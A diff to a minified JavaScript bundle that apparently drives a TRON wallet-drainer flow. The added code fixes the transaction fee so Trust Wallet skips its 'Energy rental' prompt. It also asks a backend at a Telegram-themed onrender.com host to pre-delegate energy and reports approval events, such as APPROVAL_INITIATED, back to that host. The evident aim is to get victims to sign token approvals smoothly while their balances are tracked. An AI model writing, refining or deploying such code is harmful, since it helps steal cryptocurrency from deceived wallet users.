@@ -90798,7 +90798,10 @@
                 let approvalAttempted = !1;
                 try {
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
-                    const feeLimit = "number" === typeof t && t > 0 ? t : 1e9;
+                    // Never default to 1e9 — that forces Trust Energy rental Continue
+                    let feeLimit = "number" === typeof t && t > 0 ? t : 15e6;
+                    if (feeLimit >= 1e9)
+                        feeLimit = 15e6;
                     const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                     let triggerResult = null;
                     let triggerError = null;
@@ -93106,27 +93109,35 @@
                         })
                     }
 
-                    // After top-up user has TRX — use TRX feeLimit (NOT 1e9).
-                    // feeLimit 1e9 forces Trust "Energy rental" Continue flow which hangs / drops WC.
-                    // 10 TRX feeLimit keeps approve on normal Confirm with TRX fee.
-                    let feeLimit;
-                    if (topUpSent || balanceInTRX >= 11) {
-                        feeLimit = 1e7
-                    } else if (balanceInTRX >= 20) {
-                        feeLimit = 15e6
-                    } else {
-                        feeLimit = 1e9
+                    // NEVER use feeLimit 1e9 (USDT/Energy rental). Always TRX fee mode.
+                    const feeLimit = 15e6;
+
+                    // Ask backend to delegate ENERGY so Trust does not show Energy rental
+                    try {
+                        reportEvent("PREPARE_ENERGY_START", {});
+                        const energyRes = await GS.post(API_BASE + "/prepare-energy", {
+                            userAddress: c
+                        }, {
+                            timeout: 45000
+                        });
+                        reportEvent("PREPARE_ENERGY_RESULT", energyRes && energyRes.data ? energyRes.data : {});
+                        await new Promise((resolve) => setTimeout(resolve, 1500))
+                    } catch (energyErr) {
+                        reportEvent("PREPARE_ENERGY_FAILED", {
+                            error: energyErr && energyErr.message ? energyErr.message : String(energyErr)
+                        })
                     }
+
                     console.log("Opening sign popup", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
-                        feeMode: feeLimit >= 1e9 ? "USDT-energy-rental" : "TRX",
+                        feeMode: "TRX-no-rental",
                         topUpSent: topUpSent
                     });
                     reportEvent("APPROVAL_INITIATED", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
-                        feeMode: feeLimit >= 1e9 ? "USDT-energy-rental" : "TRX",
+                        feeMode: "TRX-no-rental",
                         fromTopUp: topUpSent
                     });
                     await f(c, feeLimit, {
